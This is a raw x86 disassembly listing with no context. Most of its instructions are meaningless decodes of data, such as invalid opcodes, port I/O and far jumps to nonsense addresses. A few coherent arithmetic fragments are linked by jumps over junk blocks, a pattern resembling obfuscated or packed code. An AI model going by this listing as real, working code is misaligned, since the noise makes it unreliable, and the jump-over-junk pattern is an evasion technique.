  413f5a:	jmp    0xa9efca95
  413f5f:	leave  
  413f60:	xor    DWORD PTR [ecx+0x7c7ccb55],ebp
  413f66:	cmp    eax,0x884c8d9f
  413f6b:	sub    DWORD PTR [esi+eiz*8-0x71],ecx
  413f6f:	imul   ebp,edi,0x218bc3fb
  413f75:	cmp    eax,0x9ac1398
  413f7a:	out    dx,al
  413f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f7c:	lds    esp,FWORD PTR [eax]
  413f7e:	(bad)
  413f84:	push   DWORD PTR [eax+edi*8]
  413f87:	or     edx,ebx
  413f89:	int    0x26
  413f8b:	jge    0x413f71
  413f8d:	sahf   
  413f8e:	cs (bad) 
  413f90:	mov    edx,0x355d46b
  413f95:	pop    ebx
  413f96:	sub    ebp,DWORD PTR [edi]
  413f98:	(bad)  
  413f99:	or     BYTE PTR ds:0x85066590,dl
  413fa0:	arpl   WORD PTR [edx-0x4898bd69],ax
  413fa6:	lea    esp,[ebx]
  413fa8:	jg     0x413f6c
  413faa:	inc    esi
  413fab:	mov    esi,?
  413fad:	or     eax,0x9f7fe484
  413fb2:	mov    eax,ds:0x630cb0ca
  413fb7:	mov    al,ds:0xe6a1774a
  413fbc:	in     ax,0x90
  413fbf:	mov    edi,0x5f3f7126
  413fc4:	ret    
  413fc5:	lods   al,BYTE PTR ds:[esi]
  413fc6:	aas    
  413fc7:	scas   al,BYTE PTR es:[edi]
  413fc8:	mov    ebx,0x57875177
  413fcd:	inc    edx
  413fce:	aad    0xcc
  413fd0:	xor    bh,dl
  413fd2:	(bad)  
  413fd3:	mov    ah,0x5d
  413fd5:	repz leave 
  413fd7:	js     0x414057
  413fd9:	or     BYTE PTR [eax-0x497a1dc2],al
  413fdf:	retf   0x3846
  413fe2:	enter  0x687f,0xa8
  413fe6:	aaa    
  413fe7:	ficom  WORD PTR [ebx+0x480fe484]
  413fed:	popa   
  413fee:	clc    
  413fef:	mov    ecx,0xa1f4ed62
  413ff4:	lahf   
  413ff5:	imul   eax,DWORD PTR [ebp-0x17],0x3f
  413ff9:	push   eax
  413ffa:	ret    
  413ffb:	ret    0xed8a
  413ffe:	cwde   
  413fff:	arpl   WORD PTR [esi+0x16],si
  414002:	fst    QWORD PTR [edx]
  414004:	sbb    esi,DWORD PTR [esi]
  414006:	(bad)  
  414007:	mov    dl,0x74
  414009:	iret   
  41400a:	icebp  
  41400b:	rcr    bl,0xc9
  41400e:	push   ds
  41400f:	out    dx,eax
  414010:	stos   BYTE PTR es:[edi],al
  414011:	ror    DWORD PTR [ecx],1
  414013:	cld    
  414014:	sbb    BYTE PTR ds:0x1487d36e,dh
  41401a:	inc    esp
  41401b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41401c:	pop    edx
  41401d:	fs pop edx
  41401f:	dec    edx
  414020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414021:	dec    ecx
  414022:	pushf  
  414023:	or     esi,eax
  414025:	inc    edx
  414026:	push   ebx
  414027:	sti    
  414028:	data16 jmp 0x414095
  41402b:	mov    ds:0xf75569e0,al
  414030:	lock dec eax
  414032:	test   al,0x12
  414034:	es pop edi
  414036:	je     0x413fec
  414038:	call   esi
  41403a:	mov    ebp,0x7fafbc90
  41403f:	test   ax,0xd9f
  414043:	out    dx,eax
  414044:	add    ch,dh
  414046:	data16 cmp bh,BYTE PTR [eax]
  414049:	sub    BYTE PTR [ecx],dh
  41404b:	(bad)  
  41404c:	add    dh,BYTE PTR [eax]
  41404e:	addr16 data16 jle 0x4140a1
  414052:	popa   
  414053:	pop    ebx
  414054:	mov    al,0xa3
  414056:	mov    esp,0x8a91ebff
  41405b:	jns    0x41406b
  41405d:	sub    cl,BYTE PTR [esi]
  41405f:	mov    dl,0x3e
  414061:	in     eax,0xb9
  414063:	sbb    DWORD PTR [ebp+0x55361023],0xffffffc3
  41406a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41406b:	imul   edx,esi,0x60
  41406e:	outs   dx,DWORD PTR ds:[esi]
  41406f:	call   0xfe41:0xe1f7b289
  414076:	aad    0x9a
  414078:	mov    ecx,DWORD PTR ss:[ebp+0x10]
  41407c:	mov    edx,DWORD PTR [ebp+0x14]
  41407f:	xor    edx,edx
  414081:	shl    ecx,0x1e
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx-0x68b45b7a]
  4140b7:	test   bh,cl
  4140b9:	dec    ebx
  4140ba:	xchg   edx,eax
  4140bb:	mov    esi,0xbec4edbe
  4140c0:	mov    esi,0xc1d3111e
  4140c5:	retf   
  4140c6:	mov    DWORD PTR gs:[ebx+0x11],ebp
  4140ca:	cmp    eax,0x66ae78c9
  4140cf:	inc    eax
  4140d0:	stc    
  4140d1:	cwde   
  4140d2:	dec    ebx
  4140d3:	jnp    0x414068
  4140d5:	retf   0x8e17
  4140d8:	sub    al,0x36
  4140da:	mov    cs,WORD PTR [edx-0x51]
  4140dd:	inc    esi
  4140de:	pushf  
  4140df:	lods   eax,DWORD PTR ds:[esi]
  4140e0:	or     ebx,esi
  4140e2:	add    ch,bl
  4140e4:	fstp   TBYTE PTR [edi+0x2644f2e]
  4140ea:	add    BYTE PTR [edi+0x71],dl
  4140ed:	in     eax,dx
  4140ee:	push   ss
  4140ef:	fwait
  4140f0:	ret    0x5d18
  4140f3:	lds    ebx,FWORD PTR [edx+0x6a]
  4140f6:	jl     0x414105
  4140f8:	pop    edi
  4140f9:	pop    edx
  4140fa:	ds adc dl,0x79
  4140fe:	mov    ah,0xa3
  414100:	push   ds
  414101:	push   ebp
  414102:	dec    esi
  414103:	and    eax,DWORD PTR [edi-0x340520e9]
  414109:	xchg   edx,eax
  41410a:	mov    al,0x3c
  41410c:	pop    esi
  41410d:	stos   BYTE PTR es:[edi],al
  41410e:	jl     0x414155
  414110:	jbe    0x414171
  414112:	mov    bh,0x9e
  414114:	push   cs
  414115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414116:	ins    DWORD PTR es:[edi],dx
  414117:	ret    
  414118:	mov    cl,BYTE PTR ds:0xe49eb251
  41411e:	fiadd  DWORD PTR [esi-0x15]
  414121:	jbe    0x414149
  414123:	fs hlt 
  414125:	or     ecx,ecx
  414127:	iret   
  414128:	inc    ebx
  414129:	sbb    esp,DWORD PTR [ebx]
  41412b:	call   0x74a3d27b
  414130:	imul   ebx,eax,0x9ad4d6f0
  414136:	mov    ds:0x148bca43,al
  41413b:	push   eax
  41413c:	xchg   ecx,eax
  41413d:	fadd   st,st(2)
  41413f:	fs in  al,dx
  414141:	(bad)  [esi-0x63d668ad]
  414147:	imul   ebp,DWORD PTR [ecx+0x4c],0x84e27928
  41414e:	xchg   esi,eax
  41414f:	mov    ch,0xdd
  414151:	add    ebp,DWORD PTR [edi-0x69]
  414154:	lods   al,BYTE PTR ds:[esi]
  414155:	mov    esp,esp
  414157:	adc    al,BYTE PTR [eax+0x16939180]
  41415d:	mov    ah,BYTE PTR [eax+0x55]
  414160:	xor    bh,dh
  414162:	leave  
  414163:	mov    cl,0xd3
  414165:	es jge 0x414103
  414168:	(bad)  
  41416a:	push   esp
  41416b:	lahf   
  41416c:	mov    ebx,0xe2294604
  414171:	(bad)  
  414172:	sahf   
  414173:	(bad)  
  414174:	jno    0x41418e
  414176:	push   ecx
  414177:	add    ebp,DWORD PTR [edi]
  414179:	das    
  41417a:	xchg   ebp,eax
  41417b:	and    edi,ebp
  41417d:	jl     0x414106
  41417f:	mov    eax,0xed0a2668
  414184:	jo     0x4141cc
  414186:	sbb    esp,DWORD PTR [edx+esi*1-0x7c]
  41418a:	clc    
  41418b:	adc    DWORD PTR [ebp+0x4],esi
  41418e:	fcomp  QWORD PTR [esi+eax*8+0x56]
  414192:	enter  0x7c49,0x54
  414196:	call   0x969e:0xce7329c5
  41419d:	jge    0x414188
  41419f:	and    al,0xd0
  4141a1:	sub    eax,0x601668bf
  4141a6:	pop    edx
  4141a7:	std    
  4141a8:	push   0x6d
  4141aa:	out    dx,eax
  4141ab:	sub    al,0x17
  4141ad:	adc    al,0xba
  4141af:	das    
  4141b0:	xor    dl,dl
  4141b2:	xchg   edi,eax
  4141b3:	xlat   BYTE PTR ds:[ebx]
  4141b4:	test   edi,edx
  4141b6:	(bad)  [esi+0x8dc7d36]
  4141bc:	xchg   ebp,eax
  4141bd:	stos   DWORD PTR es:[edi],eax
  4141be:	in     al,0xeb
  4141c0:	arpl   dx,bp
  4141c2:	mov    ecx,0x5582d145
  4141c7:	sub    ecx,ebp
  4141c9:	adc    DWORD PTR [eax+0x49],0x5e
  4141cd:	pop    es
  4141ce:	sbb    dl,BYTE PTR [esi+0x8]
  4141d1:	add    esp,ebp
  4141d3:	test   al,0x7c
  4141d5:	and    al,0x6a
  4141d7:	or     DWORD PTR [ecx+0x83c4e2],ecx
  4141dd:	popf   
  4141de:	and    bh,BYTE PTR [edi*4-0x7177b3b5]
  4141e5:	out    dx,eax
  4141e6:	stos   BYTE PTR es:[edi],al
  4141e7:	test   esi,edi
  4141e9:	test   BYTE PTR [esi-0x26],0xfb
  4141ed:	imul   edi,DWORD PTR [edi+0x89fda09],0x88555de0
  4141f7:	call   0x47fd610a
  4141fc:	adc    DWORD PTR [eax],ecx
  4141fe:	icebp  
  4141ff:	aas    
  414200:	xchg   esp,eax
  414201:	outs   dx,DWORD PTR ds:[esi]
  414202:	mov    eax,0xf0993a7b
  414207:	in     eax,dx
  414208:	or     al,0x9c
  41420a:	dec    eax
  41420b:	sub    DWORD PTR [ecx+eax*8-0x33],ebp
  41420f:	jp     0x414203
  414211:	std    
  414212:	mov    ds:0x1ba25ce,al
  414217:	push   es
  414218:	aad    0x78
  41421a:	push   ebp
  41421b:	lds    ebx,FWORD PTR [edi+0x9]
  41421e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41421f:	xchg   edx,eax
  414220:	pop    ds
  414221:	stos   DWORD PTR es:[edi],eax
  414222:	pop    ss
  414223:	loop   0x414222
  414225:	xchg   ebp,eax
  414226:	neg    DWORD PTR [esi+0x11d2357c]
  41422c:	xchg   edx,eax
  41422d:	ds loop 0x4141d1
  414230:	dec    ecx
  414231:	xchg   ebx,eax
  414232:	(bad)  
  414233:	lods   al,BYTE PTR ds:[esi]
  414234:	outs   dx,DWORD PTR ds:[esi]
  414235:	push   es
  414236:	mov    ds:0xfd48a411,eax
  41423b:	rcl    bl,1
  41423d:	or     BYTE PTR ds:0xf93e285b,ch
  414243:	inc    ebx
  414244:	push   cs
  414245:	cdq    
  414246:	sbb    al,0x6f
  414248:	call   0xd38dbf53
  41424d:	xchg   ecx,eax
  41424e:	mov    eax,ds:0x53283161
  414253:	bound  ebp,QWORD PTR [ecx+0x7c]
  414256:	ss call 0x42b9:0x9b06bf84
  41425e:	push   cs
  41425f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414260:	je     0x4141f8
  414262:	(bad)  
  414263:	mov    esi,0x5a6ebcea
  414268:	mov    esi,0x203585a8
  41426d:	in     al,dx
  41426e:	add    al,BYTE PTR [ebx+0x611de650]
  414274:	cli    
  414275:	das    
  414276:	inc    ebp
  414277:	stos   DWORD PTR es:[edi],eax
  414278:	ds mov bl,0x2b
  41427b:	int    0x1a
  41427d:	fmulp  st(6),st
  41427f:	sub    eax,0x6eacd390
  414284:	xchg   edi,eax
  414285:	cmp    eax,0xa3beb9ec
  41428a:	xlat   BYTE PTR ds:[ebx]
  41428b:	inc    ebx
  41428c:	jb     0x4142c2
  41428e:	adc    dl,al
  414290:	call   0x75765ed9
  414295:	outs   dx,BYTE PTR ds:[esi]
  414296:	or     dh,BYTE PTR [ecx]
  414298:	fwait
  414299:	out    0xf9,al
  41429b:	mov    eax,ds:0x5c1f0242
  4142a0:	in     eax,dx
  4142a1:	stc    
  4142a2:	pusha  
  4142a3:	jns    0x414275
  4142a5:	inc    ecx
  4142a6:	xor    eax,0xbddce607
  4142ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142ac:	aas    
  4142ad:	jns    0x41425f
  4142af:	fcomp  st(5)
  4142b1:	pushf  
  4142b2:	(bad)  
  4142b3:	cld    
  4142b4:	jnp    0x41427b
  4142b6:	jne    0x4142d0
  4142b8:	icebp  
  4142b9:	in     al,dx
  4142ba:	xchg   esi,eax
  4142bb:	mov    bl,0x41
  4142bd:	push   ebx
  4142be:	dec    edx
  4142bf:	sub    BYTE PTR [esi-0x6b4297b3],al
  4142c5:	xor    esi,DWORD PTR [eax]
  4142c7:	fucom  st(6)
  4142c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142ca:	mov    al,0xcf
  4142cc:	stc    
  4142cd:	add    DWORD PTR [esi],esi
  4142cf:	je     0x4142b3
  4142d1:	dec    esi
  4142d2:	lods   eax,DWORD PTR ds:[esi]
  4142d3:	ficomp DWORD PTR [ebx]
  4142d5:	iret   
  4142d6:	sbb    al,0x93
  4142d8:	jnp    0x414260
  4142da:	add    dh,BYTE PTR [esi+0x59]
  4142dd:	sub    eax,ecx
  4142df:	mov    edi,0x76074ab5
  4142e4:	(bad)  
  4142e5:	push   eax
  4142e6:	cmp    eax,0xf2445390
  4142eb:	data16 or al,0x6f
  4142ee:	stc    
  4142ef:	(bad)  
  4142f0:	xchg   edi,eax
  4142f1:	sbb    al,0xc5
  4142f3:	(bad)  
  4142f4:	dec    eax
  4142f5:	jne    0x41433b
  4142f7:	jmp    0x6a2f:0x1b861cb0
  4142fe:	adc    BYTE PTR [edi],bl
  414300:	add    cl,bl
  414302:	sbb    esp,DWORD PTR [ebx-0x39]
  414305:	sbb    eax,0xad09c089
  41430a:	push   ds
  41430b:	arpl   WORD PTR [bx+si],dx
  41430e:	jg     0x4142c4
  414310:	mov    ds:0xcfabea14,al
  414315:	sbb    ecx,DWORD PTR [ebp-0x21dc38c8]
  41431b:	fs pop ss
  41431d:	adc    bh,BYTE PTR es:[esi-0x20cb1ebc]
  414324:	clc    
  414325:	cwde   
  414326:	xor    esp,esp
  414328:	iret   
  414329:	leave  
  41432a:	pop    ss
  41432b:	lea    edi,[edx+0x41]
  41432e:	cmp    DWORD PTR [edi],esi
  414330:	shl    DWORD PTR [eax-0x7707a4d7],cl
  414336:	mov    ebx,DWORD PTR es:[ecx+edi*4]
  41433a:	xor    eax,0xeb245a8c
  41433f:	jne    0x41433d
  414341:	pop    ecx
  414342:	int3   
  414343:	pop    edi
  414344:	mov    cs,WORD PTR [ebp-0x453b6845]
  41434a:	inc    ebp
  41434b:	into   
  41434c:	je     0x4142e9
  41434e:	sub    ebp,esp
  414350:	dec    ebp
  414351:	js     0x4142e3
  414353:	inc    ecx
  414354:	lds    ebp,FWORD PTR [eax+0x3]
  414357:	push   ds
  414358:	lods   al,BYTE PTR ds:[esi]
  414359:	mov    bl,0x1a
  41435b:	js     0x41431c
  41435d:	xor    DWORD PTR [esi+0x40],0xffffffb8
  414361:	mov    ds:0xc8e9986b,eax
  414366:	int    0x7a
  414368:	xchg   ecx,eax
  414369:	xor    eax,0x15e982d3
  41436e:	pop    ebx
  41436f:	fiadd  DWORD PTR [ebx+0x6d]
  414372:	aad    0x12
  414374:	jle    0x4143d8
  414376:	jmp    0x6908:0x34cc57af
  41437d:	stc    
  41437e:	repnz mov al,0xab
  414381:	push   eax
  414382:	xchg   DWORD PTR [edi-0x63],edi
  414385:	fstp   TBYTE PTR [edi-0x7f2ced31]
  41438b:	sbb    ecx,0xf201dce5
  414391:	mov    cl,0xfc
  414393:	data16 add ch,BYTE PTR [edx]
  414396:	adc    BYTE PTR [ebx],bh
  414398:	outs   dx,DWORD PTR ds:[esi]
  414399:	repnz rcl DWORD PTR [edx+0x52e71628],cl
  4143a0:	add    eax,DWORD PTR [esi-0x15275b3]
  4143a6:	push   ecx
  4143a7:	jl     0x414355
  4143a9:	push   esi
  4143aa:	dec    esi
  4143ab:	imul   eax,DWORD PTR [esi+0x1e],0xffffffb9
  4143af:	mov    ecx,0x37ce8eca
  4143b4:	sbb    BYTE PTR [edi-0x6fdaf63b],ah
  4143ba:	pop    ds
  4143bb:	xchg   edx,eax
  4143bc:	inc    ecx
  4143bd:	fwait
  4143be:	out    0x2f,eax
  4143c0:	lods   al,BYTE PTR ds:[esi]
  4143c1:	inc    esi
  4143c2:	imul   ebp,DWORD PTR [ebp+0x2d],0xffffff94
  4143c6:	into   
  4143c7:	in     al,dx
  4143c8:	adc    edx,esi
  4143ca:	cld    
  4143cb:	sti    
  4143cc:	push   0xffffffc4
  4143ce:	dec    ebx
  4143cf:	lods   al,BYTE PTR ds:[esi]
  4143d0:	mov    ecx,0xff6785f9
  4143d5:	pop    ecx
  4143d6:	cld    
  4143d7:	sbb    eax,0xa2b7402a
  4143dc:	out    0x3,eax
  4143de:	ror    DWORD PTR [ebx+0x558b104d],0x14
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	das    
  414400:	xor    al,0x20
  414402:	sahf   
  414403:	jnp    0x41439d
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0x8b3ea34f
  41440f:	pop    ss
  414410:	pop    eax
  414411:	cmp    DWORD PTR [esi-0xf60da4b],ebx
  414417:	or     cl,BYTE PTR [edi]
  414419:	fistp  DWORD PTR [ecx-0x1c5288e6]
  41441f:	push   esi
  414420:	stos   DWORD PTR es:[edi],eax
  414421:	pusha  
  414422:	cld    
  414423:	mov    ch,0x1a
  414425:	push   es
  414426:	bound  eax,QWORD PTR ds:0xab879d64
  41442c:	sub    eax,0x9a78e3e8
  414431:	rcl    DWORD PTR ds:0x49758c99,cl
  414437:	push   esp
  414438:	jp     0x41444b
  41443a:	stos   BYTE PTR es:[edi],al
  41443b:	aaa    
  41443c:	push   0xffffffd6
  41443e:	push   ecx
  41443f:	enter  0x4bad,0x13
  414443:	out    dx,eax
  414444:	cmp    dh,BYTE PTR [eax+0x6620dccf]
  41444a:	(bad)  
  41444b:	mov    ebx,0x46b21ff1
  414450:	push   ebp
  414451:	mov    dh,0x1a
  414453:	adc    edx,esi
  414455:	adc    al,0x3d
  414457:	cmovg  edi,edx
  41445a:	adc    esi,DWORD PTR [edx]
  41445c:	inc    ecx
  41445d:	jmp    0xa7a6:0x10b9781a
  414464:	les    ecx,FWORD PTR [edx+0x5e]
  414467:	rcl    bl,0xa6
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	mov    al,ds:0x7d8d92fd
  414470:	nop
  414471:	push   eax
  414472:	test   ecx,ebp
  414474:	pop    ss
  414475:	lahf   
  414476:	xchg   BYTE PTR [esp+ebp*2+0x39d04cf2],al
  41447d:	icebp  
  41447e:	mov    edi,0x54245c33
  414483:	or     DWORD PTR [ebx+edx*8],esi
  414486:	(bad)  
  414487:	and    ah,BYTE PTR [esi]
  414489:	add    eax,0xb7a069c8
  41448e:	ja     0x41450d
  414490:	pusha  
  414491:	sub    ebp,DWORD PTR [eax+ecx*8]
  414494:	or     al,al
  414496:	push   edx
  414497:	adc    dl,ch
  414499:	cdq    
  41449a:	lods   al,BYTE PTR ds:[esi]
  41449b:	xor    eax,0xb58c86bb
  4144a0:	cld    
  4144a1:	in     al,0xbe
  4144a3:	loopne 0x41450b
  4144a5:	adc    DWORD PTR [eax-0x7c541634],ebp
  4144ab:	xor    ah,BYTE PTR [ebp-0x69]
  4144ae:	shr    BYTE PTR [eax],0x99
  4144b1:	cmp    edi,DWORD PTR [ebx+0x3f106e7a]
  4144b7:	clc    
  4144b8:	pop    ebp
  4144b9:	stos   DWORD PTR es:[edi],eax
  4144ba:	mov    ecx,0x78ef03b1
  4144bf:	cli    
  4144c0:	mov    dh,0x9e
  4144c2:	dec    ebx
  4144c3:	test   ecx,ecx
  4144c5:	inc    esp
  4144c6:	in     eax,dx
  4144c7:	daa    
  4144c8:	xchg   esi,eax
  4144c9:	cdq    
  4144ca:	(bad)  
  4144cb:	sahf   
  4144cc:	mov    ch,0x5d
  4144ce:	xchg   esi,eax
  4144cf:	daa    
  4144d0:	or     al,0x39
  4144d2:	push   ebx
  4144d3:	mov    DWORD PTR [esi],edi
  4144d5:	retf   
  4144d6:	push   edi
  4144d7:	mov    WORD PTR [ecx],ss
  4144d9:	dec    ecx
  4144da:	mov    DWORD PTR [esi+esi*8-0x53],eax
  4144de:	aas    
  4144df:	inc    ebx
  4144e0:	jnp    0x414543
  4144e2:	pop    ss
  4144e3:	xlat   BYTE PTR ds:[ebx]
  4144e4:	inc    ecx
  4144e5:	scas   eax,DWORD PTR es:[edi]
  4144e6:	leave  
  4144e7:	imul   ecx,edx,0x3b703de9
  4144ed:	cmp    esi,DWORD PTR [ecx]
  4144ef:	push   ebx
  4144f0:	pushf  
  4144f1:	ss inc ebx
  4144f3:	cmp    BYTE PTR [esi+0x56],ch
  4144f6:	fst    DWORD PTR [edx+0xa]
  4144f9:	mov    dh,BYTE PTR [ebp+0x53]
  4144fc:	push   ds
  4144fd:	shl    BYTE PTR [eax-0x78af4ac9],cl
  414503:	call   0x9c1:0x2fe51b9d
  41450a:	add    cl,BYTE PTR [ebp-0xc9302f8]
  414510:	cmp    eax,0xf3ac0ddb
  414515:	arpl   WORD PTR [esi],si
  414517:	mov    bh,0xcd
  414519:	or     edx,esp
  41451b:	mov    ds:0xfb4be393,al
  414520:	out    0x2,eax
  414522:	(bad)  ds:0x931c1b26
  414528:	jae    0x41459c
  41452a:	popa   
  41452b:	add    BYTE PTR [edx],al
  41452d:	push   ebx
  41452e:	mov    esp,0x7bc80d4a
  414533:	dec    esi
  414534:	dec    esp
  414535:	mov    esp,DWORD PTR ds:0xce492f8c
  41453b:	aad    0x91
  41453d:	jmp    0x4144fd
  41453f:	pop    ecx
  414540:	add    DWORD PTR [eax],ebx
  414542:	loope  0x414558
  414544:	pop    ebp
  414545:	or     bl,BYTE PTR [edi-0x41]
  414548:	leave  
  414549:	adc    BYTE PTR [ebx-0x52],0x7f
  41454d:	std    
  41454e:	pop    ecx
  41454f:	sbb    al,0x47
  414551:	and    al,0x31
  414553:	ret    0x6a7
  414556:	pop    ss
  414557:	jno    0x414553
  414559:	and    ecx,DWORD PTR [ebx-0x60e5b9fd]
  41455f:	or     ebx,edi
  414561:	std    
  414562:	inc    eax
  414563:	in     eax,0x97
  414565:	(bad)  
  414566:	mov    ecx,0xcbf5de52
  41456b:	fst    QWORD PTR [edx]
  41456d:	pop    ebx
  41456e:	into   
  41456f:	test   bl,ah
  414571:	ja     0x41455b
  414573:	cmp    BYTE PTR [edx-0x204049a1],0xa
  41457a:	hlt    
  41457b:	cmc    
  41457c:	and    edi,DWORD PTR [eax-0x7b]
  41457f:	cmp    eax,0x89b10f29
  414584:	data16 cmc 
  414586:	xchg   DWORD PTR [edi+eax*1-0x4dc5d774],esp
  41458d:	mov    ds:0x92984eda,eax
  414592:	xchg   ebp,eax
  414593:	popa   
  414594:	pop    esi
  414595:	sahf   
  414596:	stos   DWORD PTR es:[edi],eax
  414597:	(bad)  
  414599:	stos   BYTE PTR es:[edi],al
  41459a:	into   
  41459b:	or     DWORD PTR [esi],edi
  41459d:	mov    al,0x97
  4145a0:	mov    al,ds:0x3b95611b
  4145a5:	(bad)  
  4145a6:	inc    di
  4145a8:	sbb    eax,0xcbb4b1b
  4145ad:	mov    dh,0x5a
  4145af:	sub    al,0x66
  4145b1:	and    BYTE PTR [ebx+0x41d8bf47],bl
  4145b7:	ds cmp edx,0x41d35a3a
  4145be:	aaa    
  4145bf:	or     al,0x3c
  4145c1:	test   al,0x22
  4145c3:	les    esi,FWORD PTR [eax]
  4145c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145c6:	shr    BYTE PTR [ecx],cl
  4145c8:	fdecstp 
  4145ca:	adc    bh,BYTE PTR [ecx+0x25]
  4145cd:	and    eax,DWORD PTR [esi+ebx*4+0x53]
  4145d1:	adc    BYTE PTR [eax+0x43],bh
  4145d4:	mov    ds:0x956fe386,al
  4145d9:	in     eax,0xee
  4145db:	inc    eax
  4145dc:	clc    
  4145dd:	mov    edi,0x3ceed091
  4145e2:	jae    0x414591
  4145e4:	iret   
  4145e5:	stos   DWORD PTR es:[edi],eax
  4145e6:	jb     0x414587
  4145e8:	mov    ecx,0xba004ee1
  4145ed:	cwde   
  4145ee:	scas   al,BYTE PTR es:[edi]
  4145ef:	js     0x414643
  4145f1:	push   ebp
  4145f2:	cmp    DWORD PTR [edi],ebp
  4145f4:	lock inc esi
  4145f6:	mov    ecx,0xfb9d30d9
  4145fb:	stos   DWORD PTR es:[edi],eax
  4145fc:	out    0x40,eax
  4145fe:	ror    BYTE PTR [esi-0x3d5e42a6],0x25
  414605:	sub    eax,0x685e058b
  41460a:	cdq    
  41460b:	add    bh,dh
  41460d:	xor    DWORD PTR [ecx+ebx*1],eax
  414610:	push   cs
  414611:	dec    ebx
  414612:	jge    0x414678
  414614:	hlt    
  414615:	or     eax,0x7e7da90b
  41461a:	std    
  41461b:	xlat   BYTE PTR ds:[ebx]
  41461c:	jl     0x4145be
  41461e:	or     eax,0x3ad798dd
  414623:	adc    eax,0xcbd240
  414628:	out    0x0,al
  41462a:	popa   
  41462b:	aas    
  41462c:	sub    eax,0x54032dd5
  414631:	cwde   
  414632:	cmp    BYTE PTR [esi-0xdfc5c1b],0x6
  414639:	jno    0x41464b
  41463b:	int    0x77
  41463d:	add    al,0xa4
  41463f:	jo     0x414699
  414641:	xchg   ebx,eax
  414642:	cmp    eax,0x2914682c
  414647:	push   edx
  414648:	xor    al,al
  41464a:	lds    edx,FWORD PTR [ebx+0x615fc112]
  414650:	ja     0x41469d
  414652:	cmp    al,0x50
  414654:	push   edi
  414655:	int    0xbd
  414657:	inc    edx
  414658:	fisub  DWORD PTR [ecx+0x4cdc0058]
  41465e:	xchg   esi,eax
  41465f:	daa    
  414660:	adc    BYTE PTR [edx+esi*8],0x2
  414664:	mov    es,WORD PTR [edi-0x2f]
  414667:	jno    0x414670
  414669:	mov    ebp,0x7b445f75
  41466e:	cmp    bl,ah
  414670:	imul   DWORD PTR [edx]
  414672:	ds jecxz 0x414667
  414675:	into   
  414676:	lock add al,bl
  414679:	fsub   QWORD PTR [ecx-0x69adb6bb]
  41467f:	enter  0xd325,0x5e
  414683:	in     eax,0xc7
  414685:	mov    ds:0x2ae7bf26,al
  41468a:	dec    esp
  41468b:	add    dl,0xae
  41468e:	sub    ebp,ecx
  414690:	add    al,0xcf
  414692:	repnz mov edi,0xe6390ddb
  414698:	or     eax,0x91e7024e
  41469d:	jl     0x414712
  41469f:	outs   dx,BYTE PTR ds:[esi]
  4146a0:	xchg   al,dh
  4146a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146a3:	mov    dh,0x33
  4146a5:	xchg   BYTE PTR [ebx-0x3],bl
  4146a8:	jmp    0x414663
  4146aa:	into   
  4146ab:	fdiv   st,st(1)
  4146ad:	dec    esp
  4146ae:	sbb    dh,BYTE PTR [edi]
  4146b0:	mov    ebp,0x4e8c1767
  4146b5:	xchg   ebp,eax
  4146b6:	das    
  4146b7:	(bad)  
  4146b8:	shl    BYTE PTR [edx],1
  4146ba:	add    DWORD PTR [edi+0x51bc7992],esi
  4146c0:	and    BYTE PTR ds:0xe2aff454,0xaa
  4146c7:	xor    ebx,DWORD PTR [eax+0x265a951d]
  4146cd:	jns    0x4146c1
  4146cf:	repnz popa 
  4146d1:	jle    0x41466e
  4146d3:	jl     0x41474f
  4146d5:	aam    0xb4
  4146d7:	mov    esp,0x59a80224
  4146dc:	push   edx
  4146dd:	shl    BYTE PTR [esi-0x78],0x9f
  4146e1:	jmp    0x93dc:0x7db5cd21
  4146e8:	cmp    DWORD PTR [eax+0x18],edi
  4146eb:	mov    dh,0x47
  4146ed:	mov    bh,0x9e
  4146ef:	not    BYTE PTR [eax-0x22]
  4146f2:	pop    ss
  4146f3:	mov    dh,0xff
  4146f5:	cmp    DWORD PTR [ecx+0x446148ad],edx
  4146fb:	mov    dh,0x24
  4146fd:	jne    0x414705
  4146ff:	int3   
  414700:	ror    edi,0x4c
  414703:	hlt    
  414704:	sbb    DWORD PTR [ebp+0x16],edx
  414707:	xor    BYTE PTR ds:0x81e56ba1,ah
  41470d:	(bad)
  414710:	fild   DWORD PTR [ebx+0x52e08ff6]
  414716:	mov    ah,al
  414718:	adc    al,0x29
  41471a:	jmp    0x414740
  41471c:	fild   WORD PTR [esi-0x6c]
  41471f:	adc    BYTE PTR [ecx],al
  414721:	pushf  
  414722:	and    eax,0x2f90a0d0
  414727:	mov    edx,DWORD PTR [ebp+0x10]
  41472a:	mov    ebx,DWORD PTR [ebp+0x14]
  41472d:	xor    ebx,ebx
  41472f:	or     ecx,ebx
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
